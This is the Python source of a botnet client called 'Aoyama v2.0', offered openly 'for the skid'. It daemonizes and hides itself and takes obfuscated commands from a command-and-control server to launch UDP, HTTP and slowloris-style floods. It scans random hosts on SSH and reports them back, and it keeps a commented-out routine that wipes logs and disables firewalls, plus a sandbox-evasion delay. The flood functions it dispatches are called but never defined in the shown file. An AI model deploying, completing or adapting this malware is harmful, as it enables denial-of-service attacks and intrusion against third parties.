#!/usr/bin/env python3
#Code By Leeon123 / https://github.com/Leeon123
#And Nexus / https://github.com/Nexuzzzz

###################################################
# This is a new version of python3-botnet project #
#      Added new stuff like daemon, slowloris...  #
#              Good Luck have Fun                 #
###################################################

############################
#--  Aoyama version v2.0 --#
# Improved cnc and bot     #
# Added Port Scanner       #
# Improved dos attack code #
# More easy for the skid   #
############################
import socket
import ssl
import sys
import os
import time
import random
import threading
import base64 as b64
import webbrowser
from subprocess import call
#config
cnc                  = "127.0.0.1"#your cnc ip
cport                = 1337#your cnc port
scan_ip              = "127.0.0.1"#Recevie the scanned ip
scan_port            = 911#same
sport                = 22#Scanning port
single_instance_port = 42026#You should knew this if u used mirai.
scan_th              = 50#Scanner threads
key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this


strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
stop    = False#threads control
scan    = True#Default turn the scanner on


def doom(ip, url, port):
        global stop
        #url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
        while True:
		if stop :
			break
		try:
			if webbrowser.open_new_tab(url) is True:
				break
			else:  
				webbrowser.open_new_tab(url)
				call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
		except:
			pass

def send_back(ip):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		s.settimeout(1)
		s.connect((str(scan_ip),int(scan_port)))
		s.send((xor_enc(ip,key).encode()))
		s.close()
	except:
		pass

def scanner():
	while 1:
		if scan:
			ip = gip()
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.settimeout(1)
				s.connect((str(ip),int(sport)))
				#print("Scanned sth, "+ip+":"+str(sport))
				s.close()
				send_back(ip+":"+str(sport))
			except:
				pass
		time.sleep(0.03)

def handle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			break#return main loop
		#print(tmp)
		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				#print(command)
				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=CC, args=(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBcLCQo=',key):#encoded word !doom
					if attack != 0:
						stop = True
						attack =0
					stop= False
					for _ in range(int(command[3])):
						p= threading.Thread(target=doom, args = (command[1], command[2], command[4]))#1=ip, 2=url 3=port
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAUXAw==',key):#encoded keyword: !vse
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=VSE, args =(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=STD, args =(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAHBwk=',key):
					global scan
					if command[1] == "1":
						scan = True
					if command[1] == "0":
						scan = False
				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
					sock.close()
					return 1
			except:#if have error than will pass
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
	return 0

def daemon():#daemon
	pid = os.fork()#first fork
	if pid:
		os._exit(0)
	os.chdir('/')
	os.umask(0)
	os.setsid()
	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
	if _pid:
		os._exit(0)
	sys.stdout.flush()#Refresh buffer
	sys.stderr.flush()
	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
	sys.stderr.close()

'''These function haven't need to use
def clean_device():#don't use it if u don't want be detected in dbg
	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
	os.system("rm -rf /bin/netstat")
	os.system("cat /dev/null > /var/log/wtmp")
	os.system("iptables -F")
	os.system("service iptables stop")
	os.system("/sbin/iptables -F")
	os.system("/sbin/iptables -X")
	os.system("service firewalld stop")
	os.system("rm -rf ~/.bash_history")
	os.system("history -c")
'''
def kill_port(port):#search in google
	# find pid
	if os.name == "nt": 
		result = os.popen("netstat -aon | findstr " + str(port))
		text = result.read()
		gpid = text.strip().split(' ')[-1]
		# kill pid
		result = os.popen("taskkill -f -pid "+ str(gpid)+" >nul 2>&1")
	else:
		os.system("fuser -k -n tcp "+str(port))#using 'fuser' to kill port

def single_instance():
	try:
		s = socket.socket()
		s.bind(('127.0.0.1',single_instance_port))
		s.listen(1)
		while True:
			global kill
			if kill:
				break
			a, _ = s.accept()
			a.close()
	except:
		try:
			kill_port(single_instance_port)
			single_instance()
		except:
			os.system("kill "+os.getppid())
			os._exit(0)

def conn():
	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
		if os.name != "nt":
			#os.system('rm -rf '+sys.argv[0])#delete ourselves
			daemon()#can't use in windows
			#clean_device()
		else:
			#pass
			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
	global kill
	kill = False
	for _ in range(scan_th):
		threading.Thread(target=scanner,daemon=True).start()
	threading.Thread(target=single_instance,daemon=True).start()#only can used in python3
	while True:#magic loop
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
			s.connect((cnc,cport))

			signal = handle(s)
			if signal == 1:
				if os.name != "nt":
					sys.stdin  = open("/dev/stdin")#off the stdin,stdout,stderr, indeed no need.
					sys.stdout = open("/dev/stdout")#windows can't use this method, only can use pyinstaller's option '--noconsole'
					sys.stderr = open("/dev/stderr")
				kill = True
				break

		except:
			time.sleep(random.randint(1,60))
			pass

#xor enc part#
def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )
  
if __name__ == '__main__':
	#Enable this can bypass some sandbox detection
	#time.sleep(30+random.randint(0,60))
	conn()
